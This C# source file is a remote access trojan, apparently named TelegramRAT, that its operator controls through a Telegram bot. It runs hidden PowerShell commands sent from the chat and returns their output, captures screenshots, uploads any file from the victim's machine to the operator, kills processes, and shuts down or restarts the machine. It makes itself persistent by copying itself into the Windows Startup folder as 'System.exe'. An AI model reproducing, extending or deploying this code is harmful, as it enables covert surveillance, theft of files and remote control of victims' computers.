using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.Enums;

namespace TelegramRAT
{
    public static class Program
    {
        const string usage =
    "===================================>\n" +
    "Bot commands\n" +
    "===================================>\n" +
    "[01] Start\n" +
    "[ /] /start\n" +
    "[02] Help.\n" +
    "[ /] /help\n" +
    "[03] Take Sreenshot.\n" +
    "[ /] /screenshot\n" +
    "[04] List of processes.\n" +
    "[ /] /processes\n" +
    "[05] Kill proccess.\n" +
    "[ /] /killprocess\n" +
    "[06] Download files.\n" +
    "[ /] /download\n" +
    "[07] List of files / dir.\n" +
    "[ /] /dir\n" +
    "[8] Cmd.\n" +
    "[ /] /cmd\n" +
    "[9] Current directory.\n" +
    "[ /] /curdir\n" +
    "[10] Change directory.\n" +
    "[ /] /cd\n" +
    "[11] Shutdown target Windows.\n" +
    "[ /] /shutdown\n" +
    "[12] Restart target Windows.\n" +
    "[ /] /restart\n" +
    "===================================>\n" +
    "ADD RAT TO STARTUP ==> /startup\n" +
    "===================================>\n" +
    "Created by F4RB3R";

        private static TelegramBotClient Bot;
        static int AdminId = your_id;

        static List<BotCommand> commands = new List<BotCommand>();

        static void Main(string[] args)
        {
            Bot = new TelegramBotClient(Configuration.BotToken);

            //START
            commands.Add(new BotCommand
            {
                Command = "/start",
                CountArgs = 0,
                Example = "/start",
                Execute = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Telegram RAT by FARBER, use /help to get command list");
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Use /start");
                }
            });

            //HELP
            commands.Add(new BotCommand
            {
                Command = "/help",
                CountArgs = 0,
                Example = "/help",
                Execute = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, usage);
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Use /help");
                }
            });

            //AddToStartUp
            commands.Add(new BotCommand
            {
                Command = "/startup",
                CountArgs = 0,
                Example = "/startup",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Adding...");
                        System.Diagnostics.Process startup = new System.Diagnostics.Process();
                        startup.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startup.StartInfo.FileName = "powershell.exe";
                        startup.StartInfo.Arguments = "/C " + "copy program.exe " + "'C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\System.exe'";
                        startup.Start();
                        Task.WaitAll();
                        startup.Close();
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission complete successfully!");

                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //CMD
            commands.Add(new BotCommand
            {
                Command = "/cmd",
                CountArgs = 1,
                Example = "/cmd",
                Execute = async (model, update) =>
                {
                    try
                    {
                        System.Diagnostics.Process cmd = new System.Diagnostics.Process();
                        cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        cmd.StartInfo.FileName = "powershell.exe";
                        cmd.StartInfo.Arguments = "/C " + (model.Args.FirstOrDefault()) + @" | Out-File -FilePath C:\Windows\Temp\cmdinfo.txt";
                        cmd.Start();
                        Task.WaitAll();
                        cmd.Close();
                        string processesnames = File.ReadAllText(@"C:\Windows\Temp\cmdinfo.txt");
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission complete successfully: \n" + processesnames);
                        cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        cmd.StartInfo.FileName = "powershell.exe";
                        cmd.StartInfo.Arguments = "/C " + @"del C:\Windows\Temp\cmdinfo.txt";
                        cmd.Start();
                        Task.WaitAll();
                        cmd.Close();
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error:: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //DIR
            commands.Add(new BotCommand
            {
                Command = "/dir",
                CountArgs = 0,
                Example = "/dir",
                Execute = async (model, update) =>
                {
                    try
                    {
                        string path = "C:/Windows/Temp/";
                        string curdir = Directory.GetCurrentDirectory();

                        //files
                        var filesindir = Directory.GetFiles(curdir, "*.*").Select(f => Path.GetFileName(f));
                        using (StreamWriter outputFile = new StreamWriter(Path.Combine(path, "directories.txt")))
                        {
                            foreach (string line in filesindir)
                                outputFile.WriteLine(line);
                        }

                        //directories
                        var dirsindir = Directory.EnumerateDirectories(curdir).Select(f => Path.GetFileName(f));
                        using (StreamWriter outputFile = System.IO.File.AppendText(Path.Combine(path, "directories.txt")))
                        {
                            foreach (string line in dirsindir)
                                outputFile.WriteLine(line);
                        }

                        string dirdirectories = System.IO.File.ReadAllText("C:/Windows/Temp/directories.txt");

                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Files in current directory: \n" + dirdirectories);

                        System.IO.File.Delete("C:/Windows/Temp/directories.txt");
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //PROCESSESLIST
            commands.Add(new BotCommand
            {
                Command = "/processes",
                CountArgs = 0,
                Example = "/processes",
                Execute = async (model, update) =>
                {
                    try
                    {
                        string path = "C:/Windows/Temp/";
                        Process[] processCollection = Process.GetProcesses();
                        using (StreamWriter outputFile = new StreamWriter(Path.Combine(path, "processes.txt")))
                        {
                            foreach (Process p in processCollection)
                                outputFile.WriteLine(p.ProcessName);
                        }

                        string processesnames = System.IO.File.ReadAllText("C:/Windows/Temp/processes.txt");

                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Processes: \n" + processesnames);

                        System.IO.File.Delete("C:/Windows/Temp/processes.txt");
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //PROCESSKILL
            commands.Add(new BotCommand
            {
                Command = "/killprocess",
                CountArgs = 1,
                Example = "/killprocess",
                Execute = async (model, update) =>
                {
                    try
                    {
                        foreach (Process localprocess in Process.GetProcessesByName((model.Args.FirstOrDefault())))
                        {
                            localprocess.Kill();
                        }
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission complete successfully!");
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error:" + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //CD
            commands.Add(new BotCommand
            {
                Command = "/cd",
                CountArgs = 1,
                Example = "/cd",
                Execute = async (model, update) =>
                {
                    try
                    {
                        string cdpath = (model.Args.FirstOrDefault());
                        Directory.SetCurrentDirectory(cdpath);
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Current directory: " + Directory.GetCurrentDirectory());
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error:: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //CURDIR
            commands.Add(new BotCommand
            {
                Command = "/curdir",
                CountArgs = 0,
                Example = "/curdir",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Current directory:  " + Directory.GetCurrentDirectory() + "\nusername: " + Environment.UserName);
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error:: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //SHUTDOWN
            commands.Add(new BotCommand
            {
                Command = "/shutdown",
                CountArgs = 0,
                Example = "/shutdown",
                Execute = async (model, update) =>
                {
                    try
                    {
                        System.Diagnostics.Process shutdown = new System.Diagnostics.Process();
                        shutdown.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        shutdown.StartInfo.FileName = "powershell.exe";
                        shutdown.StartInfo.Arguments = "/C shutdown /s /t 1";
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission complete successfully");
                        shutdown.Start();
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //RESTART
            commands.Add(new BotCommand
            {
                Command = "/restart",
                CountArgs = 0,
                Example = "/restart",
                Execute = async (model, update) =>
                {
                    try
                    {
                        System.Diagnostics.Process restart = new System.Diagnostics.Process();
                        restart.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        restart.StartInfo.FileName = "powershell.exe";
                        restart.StartInfo.Arguments = "/C shutdown /r /t 1";
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission complete successfully:");
                        restart.Start();
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //DOWNLOAD
            commands.Add(new BotCommand
            {
                Command = "/download",
                CountArgs = 1,
                Example = "/download",
                Execute = async (model, update) =>
                {
                    try
                    {
                        var filetodownload = (model.Args.FirstOrDefault());
                        var filetosend = new FileStream(filetodownload, FileMode.Open, FileAccess.Read, FileShare.Read);
                        {
                            await Bot.SendDocumentAsync(update.Message.From.Id, filetosend, caption: filetodownload);
                        }
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete!");
                }
            });

            //SCREENSHOT
            commands.Add(new BotCommand
            {
                Command = "/screenshot",
                CountArgs = 0,
                Example = "/screenshot",
                Execute = async (model, update) =>
                {
                    try
                    {
                        Rectangle bounds = Screen.GetBounds(Screen.GetBounds(System.Drawing.Point.Empty));
                        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                        {
                            using (Graphics g = Graphics.FromImage(bitmap))
                            {
                                g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);
                            }
                            bitmap.Save("C:/Windows/Temp/screen.jpg", ImageFormat.Jpeg);
                        }

                        using (var ScreenshotStream = new FileStream(@"C:/Windows/Temp/screen.jpg", FileMode.Open, FileAccess.Read, FileShare.Read))
                        {
                            await Bot.SendPhotoAsync(chatId: update.Message.From.Id, photo: ScreenshotStream, caption: "Screenshot!");
                        }

                        System.IO.File.Delete("C:/Windows/Temp/screen.jpg");
                    }
                    catch (Exception ex)
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "Mission wasn`t complete due error:: " + ex.Message);
                    }
                },
                OnError = async (model, update) =>
                {
                    await Bot.SendTextMessageAsync(update.Message.From.Id, "Use /screenshot");
                }
            });

            Run().Wait();

            Console.ReadKey();
        }

        static async Task Run()
        {
            await Bot.SendTextMessageAsync(AdminId, $"Started bot: {Environment.UserName}");

            var offset = 0;

            while (true)
            {
                var updates = await Bot.GetUpdatesAsync(offset);

                foreach (var update in updates)
                {
                    if (update.Message.From.Id == AdminId)
                    {
                        if (update.Message.Type == MessageType.Text)
                        {
                            var model = BotCommand.Parse(update.Message.Text);

                            if (model != null)
                            {
                                foreach (var cmd in commands)
                                {
                                    if (cmd.Command == model.Command)
                                    {
                                        if (cmd.CountArgs == model.Args.Length)
                                        {
                                            cmd.Execute?.Invoke(model, update);
                                        }
                                        else
                                        {
                                            cmd.OnError?.Invoke(model, update);
                                        }
                                    }
                                }
                            }
                            else
                            {
                                await Bot.SendTextMessageAsync(update.Message.From.Id, "Use /help to get command list");
                            }
                        }
                    }
                    else
                    {
                        await Bot.SendTextMessageAsync(update.Message.From.Id, "You are not an administrator!");
                    }
                    offset = update.Id + 1;
                }

                Task.Delay(500).Wait();
            }
        }
    }
}
